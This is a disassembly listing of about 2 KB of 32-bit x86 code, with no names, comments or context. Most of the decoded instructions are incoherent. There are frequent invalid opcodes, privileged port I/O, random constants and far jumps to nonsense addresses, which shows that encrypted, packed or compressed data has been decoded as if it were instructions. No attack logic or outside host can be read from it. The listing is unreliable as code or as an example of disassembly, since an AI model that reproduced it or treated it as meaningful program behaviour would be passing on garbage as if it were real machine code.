  41e624:	jp     0x41e687
  41e626:	dec    edx
  41e627:	es jecxz 0x41e5e1
  41e62a:	xchg   esi,eax
  41e62b:	pop    edx
  41e62c:	adc    bl,0xde
  41e62f:	push   0x3d
  41e631:	ins    DWORD PTR es:[edi],dx
  41e632:	inc    ecx
  41e633:	aaa    
  41e634:	or     dh,bh
  41e636:	mov    dh,0x3d
  41e638:	in     al,0xc
  41e63a:	cld    
  41e63b:	imul   esi,DWORD PTR [ebx],0xa51ba965
  41e641:	pop    edi
  41e642:	(bad)  
  41e643:	sbb    esi,DWORD PTR [eax]
  41e645:	not    DWORD PTR [ebp-0x6d]
  41e648:	sub    eax,0x70713322
  41e64d:	add    DWORD PTR [ebx-0x21],eax
  41e650:	or     BYTE PTR [edx],bh
  41e652:	fiadd  WORD PTR [ebx-0x58]
  41e655:	mov    esi,0xb729354a
  41e65a:	mov    dl,0xf4
  41e65c:	jns    0x41e69a
  41e65e:	aam    0x5f
  41e660:	clc    
  41e661:	sbb    al,0xce
  41e663:	repz jge 0x41e6c6
  41e666:	in     al,0x33
  41e668:	add    dh,0xcf
  41e66b:	cwde   
  41e66c:	push   ebx
  41e66d:	adc    ch,BYTE PTR [ebp+0x86a3da4]
  41e673:	mov    dh,0x3d
  41e675:	push   eax
  41e676:	cli    
  41e677:	and    BYTE PTR [eax-0x31],0x83
  41e67b:	dec    eax
  41e67c:	cmp    eax,0x6b289e26
  41e681:	inc    edi
  41e682:	cs das 
  41e684:	push   ebp
  41e685:	fmul   QWORD PTR ds:0xa37f335b
  41e68b:	xor    edx,DWORD PTR ds:0x28c76d
	...
  41e6f1:	add    BYTE PTR [eax],al
  41e6f3:	add    ch,al
  41e6f5:	cwde   
  41e6f6:	loope  0x41e74d
  41e6f8:	std    
  41e6f9:	jge    0x41e6f0
  41e6fb:	cwde   
  41e6fc:	xchg   esp,eax
  41e6fd:	push   0x37
  41e6ff:	sub    ebx,esp
  41e701:	retf   0xb9fc
  41e704:	pushf  
  41e705:	inc    ebx
  41e706:	add    DWORD PTR [eax],eax
  41e708:	add    al,0x1
  41e70a:	add    BYTE PTR [eax],al
  41e70c:	mov    cl,0xea
  41e70e:	dec    ebp
  41e70f:	cmp    DWORD PTR [ecx],esp
  41e711:	loopne 0x41e6c0
  41e713:	out    0x9f,al
  41e715:	and    DWORD PTR [ebx-0x1fcd8102],esi
  41e71b:	and    ecx,DWORD PTR [eax-0x23]
  41e71e:	mov    eax,0xfb782222
  41e723:	cmp    BYTE PTR [edx-0xc3ac9e3],al
  41e729:	pop    ss
  41e72a:	push   esi
  41e72b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e72c:	stos   DWORD PTR es:[edi],eax
  41e72d:	sbb    DWORD PTR [edi+0x1b],ecx
  41e730:	sti    
  41e731:	and    DWORD PTR [ecx],esi
  41e733:	lahf   
  41e734:	popf   
  41e735:	xchg   esi,eax
  41e736:	jo     0x41e7a2
  41e738:	xor    BYTE PTR [edx+ecx*2],ch
  41e73b:	lock jae 0x41e7b7
  41e73e:	and    eax,0x780c770
  41e743:	lods   eax,DWORD PTR ds:[esi]
  41e744:	adc    dl,BYTE PTR [eiz*8-0x68d8da76]
  41e74b:	and    BYTE PTR [edx+0x3d74888e],al
  41e751:	cmp    esi,DWORD PTR [ebx]
  41e753:	in     eax,0x20
  41e755:	out    0x75,eax
  41e757:	dec    esp
  41e758:	xchg   edx,eax
  41e759:	scas   eax,DWORD PTR es:[edi]
  41e75a:	or     eax,0x9dea8672
  41e75f:	mov    cl,0xe2
  41e761:	fidiv  DWORD PTR [edi]
  41e763:	mov    ds:0x5e04bf41,eax
  41e768:	shr    BYTE PTR [edx-0x35687bc7],cl
  41e76e:	clc    
  41e76f:	cmp    esp,DWORD PTR [edi+0x2d]
  41e772:	imul   edx,DWORD PTR ds:0x17d5e5ec,0xffffffdc
  41e779:	add    dh,BYTE PTR [esi-0x7011daf6]
  41e77f:	fld    TBYTE PTR [ecx-0x36]
  41e782:	lods   al,BYTE PTR ds:[esi]
  41e783:	stos   DWORD PTR es:[edi],eax
  41e784:	mov    WORD PTR [ecx+0x5c3beb69],ss
  41e78a:	mov    edx,0xae9c80a1
  41e78f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e790:	shl    DWORD PTR [eax],1
  41e792:	adc    eax,0x2c991c46
  41e797:	inc    edx
  41e798:	aas    
  41e799:	mov    bl,0xf6
  41e79b:	in     al,0x68
  41e79d:	push   cs
  41e79e:	not    DWORD PTR [ebp-0x4d66a106]
  41e7a4:	scas   al,BYTE PTR es:[edi]
  41e7a5:	lock repnz mov ebp,0x312499cc
  41e7ac:	sub    DWORD PTR [ecx],esp
  41e7ae:	cmp    edi,DWORD PTR [edi-0x3e]
  41e7b1:	enter  0xd115,0x6e
  41e7b5:	sub    al,0xf4
  41e7b7:	gs icebp 
  41e7b9:	shr    BYTE PTR es:[eax-0x333e5cd1],cl
  41e7c0:	adc    eax,0x9cd61c60
  41e7c5:	push   0x9003f65b
  41e7ca:	in     al,0xa3
  41e7cc:	je     0x41e7ab
  41e7ce:	imul   esp,edx,0x3973e6a6
  41e7d4:	cld    
  41e7d5:	(bad)  
  41e7d6:	fistp  DWORD PTR [edi-0x5]
  41e7d9:	sahf   
  41e7da:	gs push edx
  41e7dc:	mov    ecx,0xfbc5d73
  41e7e1:	retf   0x8d4d
  41e7e4:	mov    ch,0xe3
  41e7e6:	jmp    DWORD PTR [eax-0x77]
  41e7e9:	sti    
  41e7ea:	stos   BYTE PTR es:[edi],al
  41e7eb:	outs   dx,DWORD PTR ds:[esi]
  41e7ec:	inc    esp
  41e7ed:	xchg   edi,eax
  41e7ee:	xchg   edx,eax
  41e7ef:	aam    0x71
  41e7f1:	mov    ah,0x1b
  41e7f3:	in     eax,0xc0
  41e7f5:	pop    ss
  41e7f6:	int3   
  41e7f7:	push   0x8b576876
  41e7fc:	lods   eax,DWORD PTR ds:[esi]
  41e7fd:	add    bh,cl
  41e7ff:	lods   eax,DWORD PTR ds:[esi]
  41e800:	jmp    0x41e796
  41e802:	or     DWORD PTR [edi+0x78],edi
  41e805:	ss lahf 
  41e807:	inc    eax
  41e808:	and    eax,0x7f154bc9
  41e80d:	into   
  41e80e:	and    ebp,DWORD PTR [eax+0x0]
	...
  41e874:	sub    eax,0x9e5c8a39
  41e879:	(bad)  
  41e87a:	(bad)  
  41e87b:	jns    0x41e8ec
  41e87d:	xor    al,0xcc
  41e87f:	jg     0x41e8cf
  41e881:	adc    DWORD PTR [ecx],ebx
  41e883:	mov    ds:0x144a0,al
  41e888:	add    al,0x1
  41e88a:	add    BYTE PTR [eax],al
  41e88c:	and    al,0x44
  41e88e:	mov    bh,0x23
  41e890:	cmp    edx,0x644c6a2c
  41e896:	(bad)  
  41e897:	fiadd  DWORD PTR [eax]
  41e899:	and    al,0x9e
  41e89b:	sub    BYTE PTR [edi+ecx*1],0xab
  41e89f:	sbb    BYTE PTR [edi+0x5],ch
  41e8a2:	add    ebx,edi
  41e8a4:	enter  0x8db8,0xf9
  41e8a8:	ficomp DWORD PTR [esi+edi*8-0x21]
  41e8ac:	pop    edx
  41e8ad:	leave  
  41e8ae:	lods   eax,DWORD PTR ds:[esi]
  41e8af:	loope  0x41e87e
  41e8b1:	ds stos BYTE PTR es:[edi],al
  41e8b3:	sub    bl,BYTE PTR [eax+0x72]
  41e8b6:	push   DWORD PTR [ecx-0x24e50cfb]
  41e8bc:	clc    
  41e8bd:	cdq    
  41e8be:	and    eax,esi
  41e8c0:	das    
  41e8c1:	aas    
  41e8c2:	mov    ah,0x33
  41e8c4:	xor    eax,0xff7e29b9
  41e8c9:	or     DWORD PTR [ebx+esi*1+0x53a3f315],ebp
  41e8d0:	mov    esp,DWORD PTR [ecx-0x43]
  41e8d3:	or     ebp,DWORD PTR [edx]
  41e8d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e8d6:	jo     0x41e92a
  41e8d8:	fcomp  DWORD PTR ds:0x18e35eb0
  41e8de:	scas   al,BYTE PTR es:[edi]
  41e8df:	frstor [edx]
  41e8e1:	outs   dx,DWORD PTR ds:[esi]
  41e8e2:	shl    BYTE PTR ds:0x8cdf8669,0x61
  41e8e9:	aam    0x17
  41e8eb:	(bad)  
  41e8ec:	and    esi,DWORD PTR [edi]
  41e8ee:	cmp    al,0xf3
  41e8f0:	xor    eax,0x668f3265
  41e8f5:	mov    cl,0x4e
  41e8f7:	sahf   
  41e8f8:	mov    bh,0x92
  41e8fa:	fs sbb eax,0xaec58e29
  41e900:	inc    ecx
  41e901:	mov    ds:0xe2a70446,eax
  41e906:	icebp  
  41e907:	mov    esp,0xac8b4daf
  41e90c:	data16 fwait
  41e90e:	or     DWORD PTR [edi+0x6ee6bb85],eax
  41e914:	imul   ecx,DWORD PTR [edx],0xa69b65d9
  41e91a:	test   BYTE PTR [ebx],dl
  41e91c:	inc    ebx
  41e91d:	jno    0x41e90e
  41e91f:	ja     0x41e8ac
  41e921:	add    eax,0x3fb42483
  41e926:	sub    ebx,ecx
  41e928:	fiadd  WORD PTR ds:0xe5faf2f5
  41e92e:	and    cl,0x85
  41e931:	and    ebx,DWORD PTR [eax+0x445d6333]
  41e937:	sbb    BYTE PTR [eax],al
  41e939:	inc    eax
  41e93a:	inc    ebx
  41e93b:	outs   dx,DWORD PTR ds:[esi]
  41e93c:	jns    0x41e909
  41e93e:	test   BYTE PTR [ecx+0x3030d172],dh
  41e944:	xchg   esi,eax
  41e945:	imul   edi,DWORD PTR [eax+edi*2-0x215e4a33],0xe86d9c20
  41e950:	or     dh,0xf5
  41e953:	daa    
  41e954:	sti    
  41e955:	cs sub eax,0x10d07e50
  41e95b:	mov    edi,0x7480f6b4
  41e960:	push   es
  41e961:	std    
  41e962:	mov    ebx,ebx
  41e964:	or     BYTE PTR [ecx+0x44],dh
  41e967:	xor    al,0x56
  41e969:	ja     0x41e931
  41e96b:	pop    ds
  41e96c:	push   ecx
  41e96d:	inc    edx
  41e96e:	(bad)  
  41e96f:	sbb    eax,0x9ee8b19f
  41e974:	sbb    al,0x9f
  41e976:	fst    st(0)
  41e978:	ss pop ecx
  41e97a:	sub    eax,0xf1f1b841
  41e97f:	add    eax,0x49ca241
  41e984:	add    BYTE PTR fs:[esi-0x6c],bh
  41e988:	mov    cl,0xeb
  41e98a:	jp     0x41e986
  41e98c:	stc    
  41e98d:	shr    BYTE PTR [esi+0xf7],1
	...
  41e9f3:	add    BYTE PTR [eax-0x3],bh
  41e9f6:	ret    0xc766
  41e9f9:	jg     0x41e9f7
  41e9fb:	dec    DWORD PTR [edi+0x67]
  41e9fe:	rol    dl,1
  41ea00:	(bad)  
  41ea01:	addr16 mov ds:0xa47b,eax
  41ea05:	inc    ebp
  41ea06:	add    DWORD PTR [eax],eax
  41ea08:	add    al,0x1
  41ea0a:	add    BYTE PTR [eax],al
  41ea0c:	out    0x64,eax
  41ea0e:	popf   
  41ea0f:	jg     0x41e9c0
  41ea11:	mov    dh,0x65
  41ea13:	stc    
  41ea14:	imul   edx,DWORD PTR [edx],0xffffffcc
  41ea17:	int3   
  41ea18:	pop    ebx
  41ea19:	xor    al,0x1a
  41ea1b:	retf   0xbf97
  41ea1e:	retf   0xc13f
  41ea21:	mov    DWORD PTR [edx-0x3bc6bb48],ecx
  41ea27:	hlt    
  41ea28:	call   0xc24a:0x76e631ad
  41ea2f:	in     eax,dx
  41ea30:	mov    bl,0xb6
  41ea32:	iret   
  41ea33:	or     WORD PTR [esi-0xc750102],bp
  41ea3a:	fwait
  41ea3b:	loopne 0x41ea3d
  41ea3d:	repz fisubr DWORD PTR [ebp-0x28b757ea]
  41ea44:	cmp    edi,eax
  41ea46:	push   ebx
  41ea47:	mov    cs:0x4e7437bf,al
  41ea4d:	lahf   
  41ea4e:	arpl   di,sp
  41ea50:	ret    0x53f6
  41ea53:	pop    es
  41ea54:	lods   eax,DWORD PTR ds:[esi]
  41ea55:	and    DWORD PTR es:[ebp-0x6],0xedfe03ab
  41ea5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea5e:	add    cl,ch
  41ea60:	fbld   TBYTE PTR ds:0xcc5e5494
  41ea66:	dec    ebp
  41ea67:	dec    edi
  41ea68:	mov    ds:0x29971bec,al
  41ea6d:	sahf   
  41ea6e:	jge    0x41ea0c
  41ea70:	shl    esi,0x7c
  41ea73:	or     dh,BYTE PTR [edi+0x4387b302]
  41ea79:	jl     0x41eaf1
  41ea7b:	hlt    
  41ea7c:	inc    ebp
  41ea7d:	fstp   TBYTE PTR [ebx-0x79]
  41ea80:	jne    0x41ea71
  41ea82:	imul   esi,eax,0xd04ec81c
  41ea88:	or     DWORD PTR [eax+0x6ef55cc3],edx
  41ea8e:	xchg   edi,eax
  41ea8f:	mov    WORD PTR [esi+eiz*1+0x73eb7ff7],?
  41ea96:	dec    esi
  41ea97:	mov    ch,0xb3
  41ea99:	sub    al,0xd4
  41ea9b:	clc    
  41ea9c:	xchg   ebx,eax
  41ea9d:	arpl   WORD PTR [edx+0x13],sp
  41eaa0:	(bad)  
  41eaa1:	mov    edi,0x26abf016
  41eaa6:	mov    dh,0xf4
  41eaa8:	sub    DWORD PTR [edx+0x3f],edx
  41eaab:	xor    al,0xb8
  41eaad:	or     BYTE PTR ds:0x2c6c9f40,bl
  41eab3:	or     dh,dh
  41eab5:	fbld   TBYTE PTR [esi+eiz*4+0x26]
  41eab9:	sbb    al,0xaf
  41eabb:	and    DWORD PTR [ebx+edx*1+0x29],edx
  41eabf:	inc    ebx
  41eac0:	mov    eax,ds:0xb59d646f
  41eac5:	stos   DWORD PTR es:[edi],eax
  41eac6:	xchg   esi,eax
  41eac7:	inc    ebx
  41eac8:	mov    ds:0x50c2db1c,al
  41eacd:	push   ecx
  41eace:	cmp    DWORD PTR ds:0x1e741c47,edi
  41ead4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ead5:	or     bl,BYTE PTR [ebx-0x7fbe209c]
  41eadb:	jo     0x41ea6e
  41eadd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eade:	mov    dl,0x3e
  41eae0:	jo     0x41eac1
  41eae2:	int3   
  41eae3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eae4:	cmp    eax,0x6b9e90d4
  41eae9:	mov    al,0xcd
  41eaeb:	pop    ds
  41eaec:	imul   esp,DWORD PTR [esi+0x52],0x24b5f24b
  41eaf3:	push   es
  41eaf4:	push   es
  41eaf5:	repnz xor DWORD PTR [esi-0x7011fc44],0x10
  41eafd:	mov    al,0xbe
  41eaff:	add    DWORD PTR [esi],eax
  41eb01:	and    DWORD PTR [eax],0xecfef2fa
  41eb07:	sub    eax,0x30fa2dc5
  41eb0c:	pop    ds
  41eb0d:	mov    fs,edi
  41eb0f:	add    DWORD PTR [eax],0x0
	...
  41eb72:	add    BYTE PTR [eax],al
  41eb74:	adc    ch,BYTE PTR [edi]
  41eb76:	mov    esi,DWORD PTR [edi+edi*4+0xaaf3fb4]
  41eb7d:	out    0x9b,al
  41eb7f:	aad    0x33
  41eb81:	fnstsw WORD PTR [ebx]
  41eb83:	and    DWORD PTR [eax+0x4000146],ebp
  41eb89:	add    DWORD PTR [eax],eax
  41eb8b:	add    BYTE PTR [ecx],ch
  41eb8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eb8e:	ja     0x41eb37
  41eb90:	sbb    al,0xb7
  41eb92:	fwait
  41eb93:	adc    DWORD PTR cs:[esi-0x530958ac],esi
  41eb9a:	mov    eax,0xcfe4a82c
  41eb9f:	int    0xc6
  41eba1:	inc    edi
  41eba2:	loope  0x41eb4d
  41eba4:	dec    edi
  41eba5:	mov    ecx,0xe6c82334
  41ebaa:	call   0xb159aee6
  41ebaf:	xor    BYTE PTR [esi+ebx*1],cl
  41ebb2:	stos   DWORD PTR es:[edi],eax
  41ebb3:	xor    DWORD PTR [esi+0x997de31],ebx
  41ebb9:	pop    esi
  41ebba:	cs jae 0x41ebf9
  41ebbd:	stos   DWORD PTR es:[edi],eax
  41ebbe:	or     BYTE PTR [ebp+0x72],bh
  41ebc1:	jno    0x41eb58
  41ebc3:	pop    esi
  41ebc4:	mov    cl,0x61
  41ebc6:	and    bh,BYTE PTR [esi-0x7f]
  41ebc9:	pop    esi
  41ebca:	and    BYTE PTR [esi-0x62e2dfd4],ch
  41ebd0:	retf   0xf19e
  41ebd3:	mul    DWORD PTR [edi]
  41ebd5:	add    eax,0xf43b3a98
  41ebda:	push   esi
  41ebdb:	or     BYTE PTR [eax],al
  41ebdd:	repnz lods eax,DWORD PTR ds:[esi]
  41ebdf:	or     al,0xcd
  41ebe1:	loope  0x41ec03
  41ebe3:	repnz inc ecx
  41ebe5:	adc    BYTE PTR [ecx],al
  41ebe7:	call   0xb2c2:0xc5864112
  41ebee:	gs cmp eax,0x4f2b10f1
  41ebf4:	lea    esp,[ebx]
  41ebf6:	xchg   ecx,eax
  41ebf7:	repz rol DWORD PTR [edx+0x5a],0x87
  41ebfc:	mov    edi,0x40cca593
  41ec01:	retf   
  41ec02:	cmp    eax,0x8d1fe37e
  41ec07:	xchg   esp,eax
  41ec08:	ror    DWORD PTR [ecx-0x7c],cl
  41ec0b:	or     ah,BYTE PTR [eax]
  41ec0d:	dec    eax
  41ec0e:	and    al,0xc5
  41ec10:	into   
  41ec11:	rcr    bl,1
  41ec13:	ficomp WORD PTR [edx]
  41ec15:	mov    eax,gs:0x5e6f4483
  41ec1b:	pop    DWORD PTR [eax+0x79]
  41ec1e:	in     eax,dx
  41ec1f:	push   ecx
  41ec20:	aad    0x45
  41ec22:	add    dl,bl
  41ec24:	and    cl,dl
  41ec26:	cmp    eax,0x82ae41fe
  41ec2b:	sub    BYTE PTR [eax],0x46
  41ec2e:	int    0xa9
  41ec30:	pop    esp
  41ec31:	cmc    
  41ec32:	cwde   
  41ec33:	scas   al,BYTE PTR es:[edi]
  41ec34:	or     DWORD PTR ds:[edx+0x1b],ecx
  41ec38:	inc    edi
  41ec39:	pusha  
  41ec3a:	and    al,0x4c
  41ec3c:	daa    
  41ec3d:	cmp    al,0x19
  41ec3f:	retf   0x2f0d
  41ec42:	mov    ebx,0x640894bc
  41ec47:	pop    eax
  41ec48:	je     0x41ecad
  41ec4a:	icebp  
  41ec4b:	and    ch,BYTE PTR [esi]
  41ec4d:	push   esp
  41ec4e:	stos   DWORD PTR es:[edi],eax
  41ec4f:	outs   dx,BYTE PTR ds:[esi]
  41ec50:	das    
  41ec51:	pop    ds
  41ec52:	int3   
  41ec53:	or     DWORD PTR [eax-0x1d2e681f],ebx
  41ec59:	jmp    0x41ec35
  41ec5b:	fsub   DWORD PTR [eax-0x44]
  41ec5e:	lahf   
  41ec5f:	std    
  41ec60:	jmp    0x41ec09
  41ec62:	pop    edi
  41ec63:	cdq    
  41ec64:	or     dh,0x5
  41ec67:	xchg   esp,eax
  41ec68:	lock int 0x86
  41ec6b:	bound  ebp,QWORD PTR [ecx]
  41ec6d:	(bad)  
  41ec6f:	xor    ah,0xab
  41ec72:	cwde   
  41ec73:	(bad)
  41ec76:	or     bh,BYTE PTR [ebx]
  41ec78:	or     BYTE PTR [esi],al
  41ec7a:	dec    DWORD PTR [ecx+0xf]
  41ec7d:	mov    esp,gs
  41ec7f:	cmovle eax,eax
  41ec82:	cmp    BYTE PTR [eax+0x5b],al
  41ec85:	loop   0x41ec39
  41ec87:	enter  0x89e8,0xda
  41ec8b:	clc    
  41ec8c:	hlt    
  41ec8d:	mov    BYTE PTR [edi],dh
  41ec8f:	jp     0x41ec91
	...
  41ecf1:	add    BYTE PTR [eax],al
  41ecf3:	add    BYTE PTR [ecx-0xf],al
  41ecf6:	(bad)
  41ecf9:	hlt    
  41ecfa:	gs icebp 
  41ecfc:	dec    edi
  41ecfd:	adc    eax,0xdf735fd0
  41ed02:	ins    BYTE PTR es:[edi],dx
  41ed03:	sub    ebp,DWORD PTR [edi+eax*2+0x1040001]
  41ed0a:	add    BYTE PTR [eax],al
  41ed0c:	js     0x41ecf9
  41ed0e:	jb     0x41eca5
  41ed10:	mov    bl,0x31
  41ed12:	pop    es
  41ed13:	aaa    
  41ed14:	loop   0x41ed24
  41ed16:	push   edx
  41ed17:	loope  0x41ecd1
  41ed19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed1a:	lea    ebp,[ebp-0x2c6ff306]
  41ed20:	stc    
  41ed21:	imul   DWORD PTR [edi-0x13]
  41ed24:	xor    al,0xa7
  41ed26:	sbb    DWORD PTR [esi],edx
  41ed28:	cmp    DWORD PTR [eax-0x7b],eax
  41ed2b:	pop    edi
  41ed2c:	rcl    DWORD PTR [edx],0x8d
  41ed2f:	loope  0x41ed11
  41ed31:	cmp    ah,BYTE PTR cs:[esi]
  41ed34:	rcl    BYTE PTR [eax-0x5d],1
  41ed37:	les    esp,FWORD PTR [ebx]
  41ed39:	not    dh
  41ed3b:	pop    edx
  41ed3c:	mov    ecx,0x352362c4
  41ed41:	mov    ecx,0x202d4099
  41ed46:	inc    eax
  41ed47:	in     eax,0x7b
  41ed49:	cmp    DWORD PTR [ecx-0x79],esi
  41ed4c:	xchg   ecx,eax
  41ed4d:	add    bl,BYTE PTR [esi+0x11]
  41ed50:	jge    0x41ed0e
  41ed52:	or     BYTE PTR [ebp+0xa193fc2],bl
  41ed58:	mov    al,ds:0x221c94ea
  41ed5d:	fidivr WORD PTR [ebx]
  41ed5f:	out    0xf0,al
  41ed61:	jmp    0x4ca0e136
  41ed66:	test   ah,cl
  41ed68:	cmp    eax,0x4503ff8b
  41ed6d:	push   ss
  41ed6e:	out    0xcb,al
  41ed70:	aam    0x1b
  41ed72:	mov    eax,ss
  41ed74:	hlt    
  41ed75:	push   edx
  41ed76:	pop    ds
  41ed77:	jmp    0x391567d9
  41ed7c:	push   DWORD PTR [ebx+0x1d]
  41ed7f:	add    edi,ebx
  41ed81:	inc    eax
  41ed82:	mov    edi,0xaf15dfea
  41ed87:	and    dh,BYTE PTR [esi+0x36795c05]
  41ed8d:	div    DWORD PTR [esi+0x5ff7fce6]
  41ed93:	fwait
  41ed94:	cmp    al,0x5f
  41ed96:	jnp    0x41ee0e
  41ed98:	sahf   
  41ed99:	pop    esp
  41ed9a:	js     0x41edfd
  41ed9c:	div    DWORD PTR [ebx-0x1]
  41ed9f:	sbb    al,0xc7
  41eda1:	ds into 
  41eda3:	ficomp DWORD PTR [edx]
  41eda5:	cwde   
  41eda6:	ror    DWORD PTR [ecx+0x8],cl
  41eda9:	pop    ss
  41edaa:	jecxz  0x41ed54
  41edac:	ds inc edi
  41edae:	ss inc esi
  41edb0:	push   edx
  41edb1:	cld    
  41edb2:	xchg   BYTE PTR [eax-0x35],bh
  41edb5:	leave  
  41edb6:	bound  edi,QWORD PTR ds:0x908d864a
  41edbc:	enter  0x36f,0xbe
  41edc0:	outs   dx,DWORD PTR ds:[esi]
  41edc1:	(bad)  
  41edc2:	dec    ecx
  41edc3:	dec    edi
  41edc4:	xor    al,0xc3
  41edc7:	mov    ds:0xc24a6776,eax
  41edcc:	lods   al,BYTE PTR ds:[esi]
  41edcd:	mov    BYTE PTR [edi],dh
  41edcf:	push   ss
  41edd0:	cwde   
  41edd1:	xlat   BYTE PTR ds:[ebx]
  41edd2:	adc    DWORD PTR [esi+edi*8+0x2b],esi
  41edd6:	ds jno 0x41ee2b
  41edd9:	dec    ecx
  41edda:	mov    ds:0xfa407e4a,al
  41eddf:	inc    eax
  41ede0:	cmp    al,0xf5
  41ede2:	adc    edx,DWORD PTR [esi-0x2d]
  41ede5:	fimul  WORD PTR [ecx-0x3]
  41ede9:	sub    ah,BYTE PTR [ebx+0x6998e98d]
  41edef:	xor    eax,0xedf0453f
  41edf4:	jne    0x41ed8b
  41edf6:	or     edx,DWORD PTR [ebx+0x248fc30b]
  41edfc:	mov    BYTE PTR [ecx+0x2fc21013],dl
  41ee02:	scas   eax,DWORD PTR es:[edi]
  41ee03:	sbb    al,0xef
  41ee05:	xlat   BYTE PTR ds:[ebx]
  41ee06:	or     al,BYTE PTR [edx]
  41ee08:	test   BYTE PTR [ecx],bl
  41ee0a:	jmp    0x8e:0x55842a58
	...
  41ee71:	add    BYTE PTR [eax],al
  41ee73:	add    BYTE PTR ds:0x7b197956,al
  41ee79:	aas    
  41ee7a:	gs pop esi
  41ee7c:	pop    edx
  41ee7d:	repnz call 0xb03d:0x134e38e7
  41ee85:	dec    eax
  41ee86:	add    DWORD PTR [eax],eax
  41ee88:	add    al,0x1
  41ee8a:	add    BYTE PTR [eax],al
  41ee8c:	xor    ah,BYTE PTR [ebx+0x42e74c76]
  41ee92:	shl    DWORD PTR [edi-0x5ab5e2a1],1
  41ee98:	jmp    0x1ce2:0xd7cef430
  41ee9f:	mov    esi,0xc82a56b3
  41eea4:	pop    ds
  41eea5:	dec    esp
  41eea6:	ficom  WORD PTR [ecx]
  41eea8:	fistp  QWORD PTR [ecx+edx*1+0x51]
  41eeac:	das    
  41eead:	rcr    DWORD PTR [eax+0x23],1
  41eeb0:	mov    al,0x49
  41eeb2:	jbe    0x41ee8e
  41eeb4:	adc    DWORD PTR [ecx+0x76],0x5c
  41eeb8:	sar    DWORD PTR [ebp+0x7867ac12],cl
  41eebe:	cs jno 0x41ef23
  41eec1:	cdq    
  41eec2:	sub    al,0x12
  41eec4:	in     eax,0x94
  41eec6:	pop    esi
  41eec7:	sbb    BYTE PTR ds:0x40b47b2e,bh
  41eecd:	push   0x1db927ee
  41eed2:	fisub  DWORD PTR [eax-0x2784d23f]
  41eed8:	pop    ebp
  41eed9:	jp     0x41ef1a
  41eedb:	or     dh,bl
  41eedd:	inc    esi
  41eede:	cmp    dh,BYTE PTR [ebx]
  41eee0:	and    al,0x77
  41eee2:	neg    edx
  41eee4:	cdq    
  41eee5:	loop   0x41eeb8
  41eee7:	fidiv  DWORD PTR [edx+0x1d]
  41eeea:	ins    BYTE PTR es:[edi],dx
  41eeeb:	mov    dh,0x88
  41eeed:	dec    DWORD PTR [edi]
  41eeef:	pop    esp
  41eef0:	or     al,0x85
  41eef2:	jge    0x41ef26
  41eef4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eef5:	int    0x64
  41eef7:	jbe    0x41eea1
  41eef9:	gs xchg edx,eax
  41eefb:	shl    DWORD PTR [edi+0x53],0xd4
  41eeff:	sub    ebx,DWORD PTR [esi+0x7ad36032]
  41ef05:	leave  
  41ef06:	sub    DWORD PTR [ebx],esi
  41ef08:	inc    edi
  41ef09:	fldpi  
  41ef0b:	add    bl,BYTE PTR [ebx]
  41ef0d:	repz inc eax
  41ef0f:	lods   al,BYTE PTR ds:[esi]
  41ef10:	xor    BYTE PTR [eax],bl
  41ef12:	add    eax,0xa210958
  41ef17:	sbb    DWORD PTR [eax-0xae0c446],esi
  41ef1d:	or     al,0x2e
  41ef1f:	jmp    0x41eef0
  41ef21:	ret    
  41ef22:	xor    ebp,DWORD PTR [edi+0x954e5e0]
  41ef28:	loopne 0x41ef81
  41ef2a:	jp     0x41ef99
  41ef2c:	sahf   
  41ef2d:	inc    eax
  41ef2e:	repz (bad) 
  41ef30:	push   0x81396c82
  41ef35:	pushf  
  41ef36:	in     eax,0x71
  41ef38:	jp     0x41eee9
  41ef3a:	pop    eax
  41ef3b:	stc    
  41ef3c:	push   0x72
  41ef3e:	mov    ch,BYTE PTR [eax-0x71]
  41ef41:	cmp    eax,0x38161cc1
  41ef46:	sub    DWORD PTR [eax],0x9
  41ef49:	jg     0x41ef8b
  41ef4b:	xchg   ebp,eax
  41ef4c:	inc    edi
  41ef4d:	out    0xd,eax
  41ef4f:	xor    ebp,DWORD PTR [ebx+0x5bddc65b]
  41ef55:	out    dx,al
  41ef56:	or     ecx,edx
  41ef58:	stc    
  41ef59:	push   eax
  41ef5a:	inc    edi
  41ef5b:	xor    DWORD PTR [ebp-0x2d],ebx
  41ef5e:	push   ecx
  41ef5f:	ja     0x41ef6b
  41ef61:	icebp  
  41ef62:	icebp  
  41ef63:	loop   0x41ef0c
  41ef65:	jl     0x41efc3
  41ef67:	adc    esp,DWORD PTR [ebp+ebp*8+0x7fafcfe]
  41ef6e:	mov    cl,0x25
  41ef70:	sbb    DWORD PTR [eax+0x4f],ecx
  41ef73:	mov    ch,0x69
  41ef75:	push   edi
  41ef76:	mov    ebp,0x5896fef2
  41ef7b:	cs icebp 
  41ef7d:	push   ecx
  41ef7e:	push   es
  41ef7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef80:	mov    edx,0x373db950
  41ef85:	dec    edi
  41ef86:	popf   
  41ef87:	add    BYTE PTR [ecx+0x17],dh
  41ef8a:	fbstp  TBYTE PTR [esi-0x49]
  41ef8d:	add    eax,DWORD PTR [eax+eax*1+0x0]
	...
  41eff1:	add    BYTE PTR [eax],al
  41eff3:	add    BYTE PTR [ecx-0xda40a3],bh
  41eff9:	out    0xbb,eax
  41effb:	fisttp QWORD PTR [ecx+0x0]
  41effe:	lock imul ebx,DWORD PTR [ecx-0x32],0xfffffffe
  41f003:	jl     0x41efb9
  41f005:	dec    ecx
  41f006:	add    DWORD PTR [eax],eax
  41f008:	add    al,0x1
  41f00a:	add    BYTE PTR [eax],al
  41f00c:	jno    0x41effd
  41f00e:	pop    esi
  41f00f:	aaa    
  41f010:	nop
  41f011:	js     0x41efd5
  41f013:	sub    ecx,esi
  41f015:	test   al,0x9f
  41f017:	dec    edi
  41f018:	mov    bl,0x74
  41f01a:	cmc    
  41f01b:	outs   dx,BYTE PTR ds:[esi]
  41f01c:	pop    ecx
  41f01d:	push   edx
  41f01e:	adc    edi,0xa440cef4
